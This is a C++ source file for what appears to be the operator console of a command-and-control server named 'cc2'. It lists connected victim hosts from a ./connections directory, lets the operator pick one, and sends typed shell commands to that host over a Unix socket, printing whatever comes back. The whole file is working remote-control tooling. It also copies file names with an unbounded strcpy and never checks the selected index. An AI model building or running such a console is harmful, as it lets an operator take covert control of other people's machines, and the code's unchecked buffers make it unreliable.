#include <unistd.h>
#include <iostream>
#include <sys/un.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <dirent.h>
#include <vector>
#include <mutex>
#include <thread>
#include <sys/inotify.h>
#include <algorithm>
#include <readline/readline.h>
#include <readline/history.h>

// GLOBAL VARIABLES

bool TARGETS_SELECTED = false;
const char CLEAR_SCREEN [] = "\033[2J\033[1;1H";
const char RED_COLOR_START [] = "\033[1;31m";
const char COLOR_END [] = "\033[0m";
int fd; // file descriptor of actual connection
bool quit = false;

pid_t proc_find(const char* name) 
{
    DIR* dir;
    struct dirent* ent;
    char* endptr;
    char buf[512];

    if (!(dir = opendir("/proc"))) 
    {
        perror("can't open /proc");
        return -1;
    }
    while((ent = readdir(dir)) != NULL) 
    {
        /* if endptr is not a null character, the directory is not
         * entirely numeric, so ignore it */
        long lpid = strtol(ent->d_name, &endptr, 10);
        if (*endptr != '\0') 
        {
            continue;
        }

        /* try to open the cmdline file */
        snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
        FILE* fp = fopen(buf, "r");

        if (fp) 
        {
            if (fgets(buf, sizeof(buf), fp) != NULL) 
            {
                /* check the first token in the file, the program name */
                char* first = strtok(buf, " ");
                if (!strcmp(first, name)) 
                {
                    fclose(fp);
                    closedir(dir);
                    return (pid_t)lpid;
                }
            }
            fclose(fp);
        }
    }
  	closedir(dir);
    return -1;
}
void updateHosts (std::vector <char *> & connections)
{
	DIR *d;
    struct dirent *dir;
    d = opendir("./connections");
    if (d)
    {
    	int it = 0;
       	 while ((dir = readdir(d)) != NULL)
       	{
       		if (strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0)
       		{
            	connections.push_back(dir->d_name);
            	it++;
            }
        }
        closedir(d);
    }
}
void printHosts (const std::vector<char *> & connections)
{
	int i = 0;
	for (const auto & it : connections)
	{
		std::cout << "\033[22;36m[" << i << "]\033[0m " << it << std::endl;
		i++;
	}
}
void notifyAboutNewConnectionsWhenDisconnected (bool connectionsAvailable, std::vector<char *> & connections)
{
	int inotfd = inotify_init();
	int watch_desc = inotify_add_watch(inotfd, "./connections", IN_CREATE | IN_DELETE);
	size_t bufsiz = sizeof(inotify_event) + PATH_MAX + 1;
	inotify_event * event = (inotify_event *) malloc(bufsiz);
	while (!TARGETS_SELECTED)
	{
		read(inotfd, event, bufsiz);
		if (!connectionsAvailable)
		{
			break;
		}
		connections.clear();
		updateHosts (connections);
		if (connections.size() == 0)
		{
			std::cout << CLEAR_SCREEN;
			std::cout << RED_COLOR_START << "[*] NO CONNECTIONS YET" << COLOR_END << std::endl;
			continue;
		}
		std::cout << CLEAR_SCREEN;
		std::cout << "\n\033[22;36m[*] Please select active connection: \033[0m" << std::endl;
		printHosts (connections);
	}
}
int up_arrow_function (int a, int b)
{
	std::cout << "UP" << std::endl;
	
	return 0;
}

void commandEntered (char * command)
{
	if (command == NULL) 
	{
		quit = true;
        return;
    }
	if (write (fd,command,strlen(command)) == -1)
	{
		perror ("cannot send data to unix socket");
	}
	if (write (fd,"\n",1) == -1) // dirty hack
	{
		perror ("cannot send data to unix socket2");
	}
	if(strlen(command) > 0)
	{
		add_history(command);
	}
	free (command);

}
int main (int argc,char ** argv)
{
	while (1)
	{
		if ( (proc_find("/home/pi/Daemons/cc2") == -1 ) && ( proc_find("./cc2") == -1 ) ) // ran automatically or manually
		{
			std::cout << "\033[22;36m[!]\033[0m" << " cc server is not running, exiting..." << std::endl;
			return -1;
 		}
		std::vector <char *> connections;
		int selected {};

		updateHosts (connections);
		std::thread inotifyThread;

		if (connections.size() == 0) // no hosts yet
		{
			std::cout << CLEAR_SCREEN;
			std::cout << RED_COLOR_START << "[*] NO CONNECTIONS YET" << COLOR_END << std::endl;
			notifyAboutNewConnectionsWhenDisconnected (0, connections);	 
		}
		else  // hosts available to connect
		{
			update:
			std::cout << CLEAR_SCREEN;
			std::cout << "\n\033[22;36m[*] Please select active connection: \033[0m" << std::endl;
			printHosts (connections);

			std::thread inotifyThread (notifyAboutNewConnectionsWhenDisconnected,1, std::ref(connections) );
			inotifyThread.detach ();

    		std::cin >> selected;
    		if (std::cin.good())
    		{
    			TARGETS_SELECTED = true;
    		}
    		else
    		{
    			std::cin.clear();
				std::cin.ignore();
				goto update; // hack for malformed input
    		}
    	}
		while (TARGETS_SELECTED)
		{	
			fd_set readfds;
			char buf [0xffff];
		
			struct sockaddr_un addr;
		
	 		if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1)
		 	{
		 		perror("socket error");
		 		exit (-1);
		 	}
		
	 		memset (&addr, 0, sizeof(addr));
		 	addr.sun_family = AF_UNIX;
		 	char filepath [100] {0};
			strcpy (filepath,"./connections/");
			strcpy (filepath+14,connections[selected]);
		 	strncpy(addr.sun_path, filepath, sizeof(addr.sun_path)-1);
		
	 		if (connect(fd, (struct sockaddr*) &addr, sizeof(addr)) == -1)
		 	{
 		 		perror ("connect error");
		 		exit (-1);
		 	}
		 	std::cout << "[*] Connected with " << connections[selected] << std::endl;

		 	rl_callback_handler_install ("> ", &commandEntered); // NOW WE ARE USING SHELL EXPANSIONS
			while (1)
			{
				FD_ZERO(&readfds);
				FD_SET(fd, &readfds);
				FD_SET(0, &readfds);	
				int ret = select(FD_SETSIZE, &readfds, NULL, NULL, NULL); // select unix socket or stdin to read from
				if (ret > 0)
				{
					if (FD_ISSET(fd, &readfds)) // GET DATA FROM REMOTE HOST
					{
						int r = read (fd,buf,0xffff);
						if (r > 0)
						{
							int s = strlen(buf);
							for (int i = 0 ; i < s; i++)
							{
								if (buf[i] == '\xa0') // windows hack
								{
									buf[i] = '\x20';
								}
							}
							std::cout << buf << std::flush;
						}
						else if (r == -1)
						{
							 perror ("cannot read from unix socket");
							 break;	
						}
						else if (r == 0)
						{
							std::cout << "[!] Connection closed by remote host or server is down" << std::endl;
							TARGETS_SELECTED = false;
							rl_callback_handler_remove ();
							break;
						}
						memset (buf,0,0xffff);
					}
					else if (FD_ISSET(0, &readfds)) // SEND DATA TO REMOTE HOST
					{
						rl_callback_read_char();
					}
				}
				else if (ret < 0)
				{
					perror ("error with select");
					// error handling for select errror
				}
			}
		}
	}
	
	return 0;
}
